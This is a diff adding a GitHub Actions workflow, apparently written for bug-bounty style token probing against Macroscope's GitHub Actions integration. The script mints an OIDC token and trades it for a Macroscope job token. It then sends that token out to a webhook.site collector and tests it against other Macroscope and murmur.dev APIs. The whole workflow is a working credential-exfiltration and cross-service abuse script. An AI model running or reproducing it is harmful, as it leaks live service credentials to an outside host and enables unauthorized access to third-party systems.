@@ -1,0 +1,52 @@
+name: tokenprobe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: token cross-service probe
+        run: |
+          set -u
+          API="https://actions.macroscope.com/api/v1/github-actions/agent-runs"
+          U=$(env | awk -F= '/^ACTIONS_ID_[A-Z_]*REQUEST_URL=/ {sub(/^[^=]*=/,"");print;exit}')
+          T=$(env | awk -F= '/^ACTIONS_ID_[A-Z_]*REQUEST_/ && !/URL=/ {sub(/^[^=]*=/,"");print;exit}')
+          OK=$(curl -sS -H "Authorization: bearer $T" "${U}&audience=macroscope" | jq -r .value)
+          C=0000000000000000000000000000000000000000
+          R=$(curl -sS -X POST -H "Authorization: Bearer $OK" -H "Content-Type: application/json" \
+            -d "{\"repository\":\"awley-del/bb-x33\",\"review\":{\"kind\":\"approvability\"},\"commit\":\"$C\",\"base\":\"$C\",\"pullRequest\":1}" "$API")
+          RID=$(echo "$R" | jq -r .runId)
+          JT=$(echo "$R" | jq -r .jobToken)
+          echo "START_STATUS_RUNID=$RID"
+          echo "JOBTOKEN_LEN=${#JT}"
+          # ship the token to a private collector so it can be tested from outside
+          curl -sS -m 20 -X POST "https://webhook.site/b0e2dd8d-93a2-453e-85c6-2d023dd3ec3b" \
+            -H 'content-type: application/json' \
+            --data-binary "$(jq -cn --arg t "$JT" --arg r "$RID" '{jobToken:$t,runId:$r}')" >/dev/null
+          echo "COLLECTOR_POSTED=1"
+          # cross-service acceptance tests from the runner itself
+          for target in \
+            "https://api.macroscope.com/api/v1/workspaces/GITHUB_USER/187846895" \
+            "https://api.macroscope.com/mcp" \
+            "https://api.murmur.dev/v1/whoami" ; do
+            if [ "${target##*/}" = "mcp" ]; then
+              S=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X POST "$target" \
+                -H "Authorization: Bearer $JT" -H 'content-type: application/json' \
+                -H 'Accept: application/json, text/event-stream' \
+                -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}')
+            else
+              S=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $JT" "$target")
+            fi
+            echo "PROBE $target HTTP=$S"
+          done
+          # control: the same requests with a random jwt-shaped string
+          for target in "https://api.macroscope.com/api/v1/workspaces/GITHUB_USER/187846895" ; do
+            S=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer aaa.bbb.ccc" "$target")
+            echo "CONTROL $target HTTP=$S"
+          done
